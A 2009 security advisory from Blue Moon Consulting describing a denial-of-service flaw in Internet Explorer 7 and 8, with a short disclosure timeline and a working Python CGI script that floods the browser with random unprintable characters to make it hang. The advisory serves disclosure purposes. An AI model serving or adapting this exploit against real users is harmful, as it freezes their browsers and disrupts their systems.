BLUE MOON SECURITY ADVISORY 2009-04
===================================


:Title: Remote Denial of Service in Internet Explorer
:Severity: Moderate
:Reporter: Blue Moon Consulting
:Products: Internet Explorer 7 and 8
:Fixed in: --


Description
-----------

We could not find out the definitive description for Internet Explorer from Microsoft website. This is our own understanding of the application: Internet Explorer is a web browser.

We have discovered a remote DoS vulnerability in Internet Explorer 7 and 8. When visit a malicious page, the browser may freeze indefinitely and killing it in Task Manager is required. With IE8's default settings, killing the tab process simply launches another process and goes to the same malicious page, hence repeating the cycle. The root cause is unknown to us. We suspect that it is related to the display of unprintable characters on Windows XP, and Vista. The same problem does not occur in Windows 7.

Microsoft has classified this vulnerability as a stability (not security) issue and will be addressing it in the next version of the application.

Workaround
----------

There is no workaround.

Fix
---

This problem is to be fixed in the next version of Internet Explorer.

  April 03, 2009: Jack told us Microsoft only experienced temporary DoS and in no case did Internet Explorer hang indefinitely.

  April 06, 2009: We sent Jack a video clip, in PGP MIME format.

  April 06, 2009: Jack asked us to resend because the email was stripped again.

  April 07, 2009: We resent the clip in plain text to Jack.

:Exploit code: The following CGI script causes IE to hang indefinitely.

::

  #!C:/python25/python
  import sys
  import random
  
  CHAR_SET = [chr(x) for x in range(0x20)]
  CHAR_SET += [chr(x) for x in range(128, 256)]
  
  def send_file():
  	l = 800000 + 4096
  	print "Content-Type: text/plain"
  	print "Content-Length: %d" % l
  	print "Cache-Control: no-cache, no-store, must-revalidate"
  	# this is not standardized, but use it anyway
  	print "Pragma: no-cache"
  	print ""
  	# bypass IE download dialog
  	sys.stdout.write("a" * 4096)
  	# print junks
  	for i in xrange(l):
  		sys.stdout.write(random.choice(CHAR_SET))
  	sys.exit()
